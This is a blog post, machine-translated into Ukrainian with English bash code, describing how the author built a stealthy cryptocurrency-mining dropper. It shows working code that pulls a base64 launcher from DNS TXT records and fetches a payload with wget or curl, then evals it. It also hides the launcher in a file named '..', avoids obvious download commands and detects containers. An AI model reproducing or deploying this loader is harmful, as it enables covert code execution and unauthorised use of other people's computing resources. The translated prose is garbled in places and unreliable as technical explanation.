both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/uk/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link href=https://www.unto.re/de/posts/chronichles_of_a_cryptonote_dropper hreflang=de rel=alternate><link href=https://www.unto.re/it/posts/chronichles_of_a_cryptonote_dropper hreflang=it rel=alternate><link href=https://www.unto.re/zh/posts/chronichles_of_a_cryptonote_dropper hreflang=zh rel=alternate><link href=https://www.unto.re/es/posts/chronichles_of_a_cryptonote_dropper hreflang=es rel=alternate><link href=https://www.unto.re/hi/posts/chronichles_of_a_cryptonote_dropper hreflang=hi rel=alternate><link href=https://www.unto.re/ar/posts/chronichles_of_a_cryptonote_dropper hreflang=ar rel=alternate><link href=https://www.unto.re/pt/posts/chronichles_of_a_cryptonote_dropper hreflang=pt rel=alternate><link href=https://www.unto.re/bn/posts/chronichles_of_a_cryptonote_dropper hreflang=bn rel=alternate><link href=https://www.unto.re/ru/posts/chronichles_of_a_cryptonote_dropper hreflang=ru rel=alternate><link href=https://www.unto.re/ja/posts/chronichles_of_a_cryptonote_dropper hreflang=ja rel=alternate><link href=https://www.unto.re/pa/posts/chronichles_of_a_cryptonote_dropper hreflang=pa rel=alternate><link href=https://www.unto.re/jw/posts/chronichles_of_a_cryptonote_dropper hreflang=jw rel=alternate><link href=https://www.unto.re/vi/posts/chronichles_of_a_cryptonote_dropper hreflang=vi rel=alternate><link href=https://www.unto.re/fr/posts/chronichles_of_a_cryptonote_dropper hreflang=fr rel=alternate><link href=https://www.unto.re/ur/posts/chronichles_of_a_cryptonote_dropper hreflang=ur rel=alternate><link href=https://www.unto.re/tr/posts/chronichles_of_a_cryptonote_dropper hreflang=tr rel=alternate><link href=https://www.unto.re/pl/posts/chronichles_of_a_cryptonote_dropper hreflang=pl rel=alternate><link href=https://www.unto.re/uk/posts/chronichles_of_a_cryptonote_dropper hreflang=uk rel=alternate><link href=https://www.unto.re/nl/posts/chronichles_of_a_cryptonote_dropper hreflang=nl rel=alternate><link href=https://www.unto.re/el/posts/chronichles_of_a_cryptonote_dropper hreflang=el rel=alternate><link href=https://www.unto.re/sv/posts/chronichles_of_a_cryptonote_dropper hreflang=sv rel=alternate><link href=https://www.unto.re/zu/posts/chronichles_of_a_cryptonote_dropper hreflang=zu rel=alternate><link href=https://www.unto.re/ro/posts/chronichles_of_a_cryptonote_dropper hreflang=ro rel=alternate><link href=https://www.unto.re/ms/posts/chronichles_of_a_cryptonote_dropper hreflang=ms rel=alternate><link href=https://www.unto.re/ko/posts/chronichles_of_a_cryptonote_dropper hreflang=ko rel=alternate><link href=https://www.unto.re/th/posts/chronichles_of_a_cryptonote_dropper hreflang=th rel=alternate><link href=https://www.unto.re/tl/posts/chronichles_of_a_cryptonote_dropper hreflang=tl rel=alternate><link title="сайт undoreh"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/uk/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.png property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=en_US property=og:locale><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2022,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Хроніки крапельниці криптонота</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/uk/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/uk/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2022-03-05T20:57:22.889","inLanguage":"uk","name":"","mainEntityOfPage":{"@id":"/uk/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/uk/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/uk/posts/><i class="fas fa-pen menu-icons"></i> дописів</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/uk/media/><i class="fas fa-tv menu-icons"></i> ЗМІ</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/uk/posts/><i class="fas fa-pen menu-icons"></i> дописів</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/uk/media/><i class="fas fa-tv menu-icons"></i> ЗМІ</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/uk/posts/chronichles_of_a_cryptonote_dropper> Хроніки крапельниці криптонота</a></h1><blockquote id=page-description style=font-style:italic>... Як далеко ви готові піти за ... копійки?</blockquote></div><div class=franklin-content><p>Припустимо, ти хочеш добувати<a href=https://en.wikipedia.org/wiki/Cryptocurrency> криптовалюти</a> на пульті дистанційного керування<em> віртуальний</em> апаратне забезпечення. Вам потрібно знайти щось моє. Віддалені сервери означає, що ні<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> або алгоритми підтвердження роботи графічного процесора, лише в основному<a href=\posts/a-few-notes-on-proof-of-work> Монети, зручні для процесора</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Програмне забезпечення</a></h2><p>Знайдіть і знайдіть a<a href=https://github.com/xmrig/xmrig> шахтар</a> , але це не дуже приємно, ви хотіли б, щоб ви могли краще керувати з дистанційного керування, щоб ви знайшли<a href=https://github.com/Bendr0id/xmrigCC> інший майнер</a> . Ви також хочете, щоб<a href=https://github.com/Bendr0id/xmrigcc-proxy> проксі</a> , оскільки багато зв’язків будуть короткочасними, ви цього не хочете<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> дос</a> ваш майнінг -пул. Також а<a href=https://github.com/search?q=tunnel> тунель</a> було б непогано.<h2 id=the_design><a class=header-anchor href=#the_design> Дизайн</a></h2><p>Деякі ботнети використовують дані блокчейну для пошуку команд,<a href=https://twitter.com/sarahjamielewis> хтось</a> також, схоже, має<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> програні ставки</a> це більше не повторюється ... все одно ми не такі складні, ми обійдемося деякими записами DNS, які зберігають скрипт, який витягує корисне навантаження, яке саморозпаковується у тимчасовому каталозі, виконується і залишається<em> майже</em> ніяких слідів його установки. Ось невелика блок -схема, яка зображує структуру<h2 id=launcher><a class=header-anchor href=#launcher> Пускова установка</a></h2><p>Суть сценарію запуску повинна бути доступною та легко оновлюваною, щоб вона витримувала перевірку часом. Оновлення<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> записи прості, а DNS - це останнє, що припиняє роботу в мережі .. тому що IP -адреси важко запам'ятати ... тому велика ймовірність, що вони будуть доступні в більшості випадків. Ви бачите, коли ми<em> отримання сценарію розгортання</em>ми фактично вже використовуємо певну логіку, це сценарій запуску, йому потрібна можливість виконувати DNS -запити для пошуку наших записів, DNS може бути всюдисущим, але<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> копати</a> не.<p>Тут є невелика загадка, якщо нам доведеться завантажити інший інструмент<em> завантажити інший сценарій, щоб завантажити корисне навантаження</em> нам слід просто завантажити корисне навантаження! В обороні ... виконання цього сценаривного танцю додає заплутаності, дозволяє зберігати лише одну реалізацію пускової установки (ремонтопридатність, ага), не потрібно більшість разів ... тому ми також обслуговуємо<a href=https://en.wikipedia.org/wiki/Standalone_program> статично пов'язані</a> копати виконуваний файл для виконання запитів dns, отриманих або шляхом самостійного розміщення, або за допомогою хмарного хостингу (так, є резервні варіанти, наприклад 3 або 4, оскільки хмарні служби мають дуже мінімальну вільну пропускну здатність, а також вимагають файли cookie або маркери доступу ... вони дуже сценарійні недружелюбно, цілеспрямовано, звичайно).<p>Що є у записах dns? Ми використовуємо<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> записів у користувацькому домені (резервні варіанти також тут). Чому TXT? саме вони можуть зберігати найбільшу кількість даних .. зазвичай це так<a href=https://www.ietf.org/rfc/rfc6763.txt> рекомендовано</a> в залежності від<em> речі</em> . Ми спеціально використовуємо<a href=https://www.cloudflare.com/> хмари</a> для нашого DNS -скрипування, оскільки він безкоштовний і майже єдиний гравець у місті (<em> Ну, насправді не так, але будь -які інші альтернативні функції бліді</em> ). Трапляється, що ви можете зберігати кілька фрагментів даних на<em> те саме</em> запис ... це стає заплутаним і скремблірує для деяких специфікацій ... (дотична) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> звик до</a> дозволити<em> прикутий</em>Записи TXT на загальну суму ~ 9k байт, зараз документи містять ~ 2k байт, я думаю, що до зміни я використовував ~ 6k, і я обслуговував скрипт без стиснення, після чого мені довелося розробити сценарій і стиснути його перед рукою (насправді я намагався використати a<a href=https://freedns.afraid.org/> вільні</a> постачальника, я був заборонений протягом одного дня, здогадуючись, що вони мають сувору політику щодо записів TXT без жиру), проте стиснення gzip, здається, НЕ дружнє до каналу і все ще викликало проблеми, тому мені довелося втиснути сценарій без стиснення ( кінцевий тангенс).<p>Як ми його зберігаємо? Записи TXT підтримують лише буквено -цифрові рядки, ні<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> , тому ми повинні обернути його в ненульове кодування,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> задовольняє цьому обмеженню та тому, що ми зберігаємо<em> прикутий</em> Записи TXT, ми повинні розділити вихід на частини, оскільки ми використовуємо матеріал оболонки, це робиться через<code>-w</code> прапор, на зайнятій коробці такий прапор був відсутній (або ввімкнути) у старих версіях, що дратувало, альтернативою є використання кодера в комплекті з openssl,<code>openssl enc -base64</code>.<p>Тепер, коли ми знаємо, як зберігати наш сценарій розгортання, ми також зберігаємо його<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> або вручну. Як нам це витягнути? Ми згадували, що нам потрібні біндутіли або наші власні<code>dig</code> ... після того, як ми вибрали кінцеву точку обслуговування, ми хочемо її завантажити, як правило, доступне<a href=https://www.gnu.org/software/wget/> wget</a> або<a href=https://curl.se/> завивати</a> , wget зустрічається попередньо встановленим набагато частіше, однак busybox забезпечує лише підтримку tls за допомогою динамічних бібліотек, тому вам потрібно переконатися, що кінцева точка обслуговує http або ваша утиліта<code>wget</code> від gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Це означає спробувати<code>-t2</code> часів очікування<code>-T10</code> секунд<code>-q</code> тихе читання з<code>-i-</code> stdin (<code>$digurl</code> ) і написати на<code>-O-</code> stdout (<code>$filename</code>). Ця команда не показує, що ми завантажуємо на перший погляд. Ми будемо дуже обережні з іншими командами оболонки з тієї ж причини, або дотримуючись оболонки (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> баш</a> ) вбудовані, де це можливо. Також подбайте про те, де ви завантажуєте свої виконувані файли, ви хочете переконатися, що ви можете їх виконувати, оскільки деякі точки монтування, особливо в контейнерах і<code>tmp</code> шляхи є<code>noexec</code> . Тепер, коли у нас є інструмент запитів dns, ми отримуємо наші записи<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Прапори тут зрозумілі,<code>+short</code> просто означає, що нас цікавлять лише самі дані, так що нам не потрібно аналізувати вихідні дані. Важливо вказати DNS -сервер, наприклад google (<code>8.8.8.8</code> ) або cloudflare (<code>1.1.1.1</code> ) тому, що багато середовищ за замовчуванням переспрямовують запити DNS або проксі -сервера на власні сервери DNS. Після того, як ми отримали фрагмент скрипта, ми маємо справу з лапками та пробілами, щоб зробити його готовим до декодування<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Що, якщо зараз ми<em> нерухомо</em> у нас немає пускової установки? DNS безладна, ми хочемо резервного копіювання, дозволяє налаштувати субдомен, щоб безпосередньо отримати скрипт запуску. Перш ніж оцінити наш скрипт, ми хочемо налаштувати його з деякими змінними, знову ж таки, дозволимо використати запис TXT для зберігання списку змінних NAME = VALUE та його аналізу. Існує також резервний варіант для змінних, cloudflare пропонує переспрямування на основі URL -адрес, ці переспрямування обслуговуються<em> раніше</em> призначення, тому нам не потрібна кінцева точка, ми просто хочемо налаштувати правила переспрямування на основі регулярних виразів до фіктивної кінцевої точки, що нас цікавить - це параметри URL -адреси<code>?NAME=VALUE&NAME2=VALUE2...</code>, щоб ми могли параметризувати нашу панель запуску, просто змінивши URL -адресу переспрямування, завжди звертаючи увагу на цитування та екранні коди<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>Wget<code>-S</code> друкує URL -адресу переспрямування, яка нас цікавить для синтаксичного аналізу. Маючи параметри та сценарій, ми оцінюємо змінні, що записують їх у файл<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Цей файл буде отримано за допомогою сценарію розгортання. Остання частина сценарію запуску - актуальна<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> батут</a> , оцінити сценарій у поточному процесі оболонки або, можливо, дозволити йому керувати tmux.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Сценарій запуску скидається у файл з назвою "..". Це виглядає заплутаним, оскільки його можна помилково прийняти за файл<em> батько</em> каталог. І ми не включаємо команду session, оскільки вона затримується в команді process, натомість ми заздалегідь запускаємо сеанс tmux і надсилаємо вихідну команду через інтерфейс терміналу tmux. З цим пов’язано іноді виклик виконуваного файлу за допомогою<code>./</code> зберігає ці символи в команді, тому краще додати<code>$PWD</code> на стежку ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Корисне навантаження</a></h2><p>Наш сценарій розгортання починається з пошуку<code>env.sh</code> файл, а зберігання або налаштування змінних як<code>STARTING_*</code> різні як<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Це дозволяє нам знищувати та перезапускати запущений екземпляр під час скидання налаштувань середовища. Давайте перейдемо до каталогу tmp з можливостями exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Перевірка, якщо в межах a<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> контейнер</a> це також зручно, ми можемо перевірити файлову систему на підказки<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Тепер настав час завантажити наше корисне навантаження, ми вирішили підтримувати як wget, так і curl, ми вже знаємо, як використовувати wget з ретельними прапорцями, для curl це дещо інакше. Ми повинні створити файл конфігурації та змінити його<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Останнім кроком є ​​просто вилучення корисного навантаження<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Варто згадати використання [CDN] для обслуговування корисного навантаження. Тут знову на допомогу рятують cloudflare від витрат на пропускну здатність. Просто перейменувавши наше стиснене корисне навантаження на<em> розширення файлу</em> підтримується cloudflare ... він стає кешованим. Cloudflare не перевіряє заголовки того, що він обслуговує, можливо тому, що робити це в такому масштабі просто недоцільно.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Пригоди по Бешленду</a></h2><p>Bash було вибрано з припущенням, що він портативний, не виглядає занадто недоречним і є більш повсюдним у порівнянні з іншими мовами сценаріїв, такими як perl, ruby ​​або python. Правда в тому, що автономний двійковий файл, написаний голангом або луа, був би набагато простішим, з меншою кількістю помилок і простішим у обслуговуванні, в основному bash був найгіршим можливим вибором, на мій захист, до того часу, коли я подряпав так багато свербіння bash , було вже пізно для переписування, а також стало нудно.<p>Існує також можливість використовувати busybox з прапором часу компіляції для використання всіх вбудованих файлів (наприклад, grep та sed), однак використання вбудованих таким чином не дозволяє породити завдання (форк) і демонструє демону потенційні тупики.<p>Я опишу деякі функції bash тут із повним списком<a href=\assets/posts/bash_functions.txt> тут</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Використовувати<code>RANDOM</code> змінна, щоб отримати число між 97-122, що відповідає коду символів, printf має бути вбудованим, ми не хочемо роздвоєння у циклі.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Використовуйте канали для створення анонімних дескрипторів файлів, вони не поводяться так само, як дескриптори файлів, але вони досить хороші для<a href=https://en.wikipedia.org/wiki/Inter-process_communication> МПК</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Спить без роздвоєння, зловживаючи функціями тайм -ауту вбудованого читання, він використовує спеціальний дескриптор файлів, і ми повинні переконатися, що він доступний, щоб уникнути припинення.<p>Є такі функції, як<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> використовуються для моніторингу використання системи, усі вони використовують linux<code>/proc</code> файли без таких інструментів, як<code>ps</code> , так що без роздвоєння, все чисто баш.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
